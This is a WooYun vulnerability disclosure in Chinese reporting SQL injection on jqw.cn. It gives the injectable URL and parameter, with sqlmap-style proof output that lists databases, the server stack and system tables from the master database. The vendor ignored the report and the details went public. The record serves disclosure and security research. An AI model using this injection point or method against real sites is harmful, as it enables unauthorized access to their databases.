wybug_title: 金泉网主站sql注入漏洞一枚
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2013-11-21：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-01-05：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 金泉网sql注入一枚 详细说明：  注入地址： http://www.jqw.cn/c.aspx?keyword=a'   漏洞证明：  available databases [7]:                                                       [*] BIZ_157[*] BizEn[*] master[*] model[*] msdb[*] SOADMIN[*] tempdbweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[07:51:22] [INFO] fetching tables for database: master[07:51:22] [INFO] the SQL query used returns 359 entries[07:51:23] [INFO] retrieved: "sys.database_audit_specifications"[07:51:24] [INFO] retrieved: "sys.database_files"[07:51:25] [INFO] retrieved: "sys.database_mirroring"[07:51:26] [INFO] retrieved: "sys.database_mirroring_endpoints"[07:51:27] [INFO] retrieved: "sys.database_mirroring_witnesses"[07:51:28] [INFO] retrieved: "sys.database_permissions"[07:51:29] [INFO] retrieved: "sys.database_principal_aliases"[07:51:30] [INFO] retrieved: "sys.database_principals"[07:51:31] [INFO] retrieved: "sys.database_recovery_status"[07:51:32] [INFO] retrieved: "sys.database_role_members"[07:51:33] [INFO] retrieved: "sys.databases"[07:51:34] [INFO] retrieved: "sys.default_constraints"[07:51:35] [INFO] retrieved: "sys.destination_data_spaces"[07:51:36] [INFO] retrieved: "sys.dm_audit_actions"[07:51:37] [INFO] retrieved: "sys.dm_audit_class_type_map"[07:51:38] [INFO] retrieved: "sys.dm_broker_activated_tasks"[07:51:39] [INFO] retrieved: "sys.dm_broker_connections"[07:51:39] [INFO] retrieved: "sys.dm_broker_forwarded_messages"[07:51:40] [INFO] retrieved: "sys.dm_broker_queue_monitors"[07:51:42] [INFO] retrieved: "sys.dm_cdc_errors"[07:51:42] [INFO] retrieved: "sys.dm_cdc_log_scan_sessions"[07:51:43] [INFO] retrieved: "sys.dm_clr_appdomains"[07:51:44] [INFO] retrieved: "sys.dm_clr_loaded_assemblies"...响应太慢没有继续深入   修复方案：  加强过滤   版权声明：转载请注明来源 小Z@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
